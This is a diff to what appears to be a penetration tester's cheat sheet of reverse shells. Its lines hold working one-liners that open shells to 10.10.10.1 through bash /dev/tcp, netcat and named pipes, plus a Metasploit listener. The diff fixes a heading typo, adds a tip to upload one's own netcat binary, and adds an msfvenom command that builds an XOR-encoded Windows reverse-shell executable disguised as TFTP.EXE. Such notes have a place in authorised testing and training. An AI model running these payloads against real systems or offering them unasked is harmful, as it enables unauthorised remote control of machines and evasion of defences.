@@ -38,7 +38,7 @@ Perl/CGI
 
 
 ## LINUX
-#### COMON
+#### COMMON
 ````
 bash -i >& /dev/tcp/10.10.10.1/4444 0>&1  
 
@@ -47,6 +47,8 @@ mknod backpipe p && nc 10.10.10.1 4445 0<backpipe | /bin/bash 1>backpipe
 mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i |nc 10.10.10.1 4444 >/tmp/f2 
 
 nc -e /bin/bash 10.10.10.1 4444
+
+## If NC is not on the box, or isn't working, transfer your own binary!!!
 
 ````
 #### MORE
@@ -113,6 +115,8 @@ Listener
 msfconsole -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 4445; run -j" 
 
 UnStaged 
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.152 LPORT=80 --format exe --arch x64 --platform windows --encoder x64/xor --iteration 2 EXITFUNC=thread --smallest > TFTP.EXE
 
 msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.49.99 LPORT=445
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf  
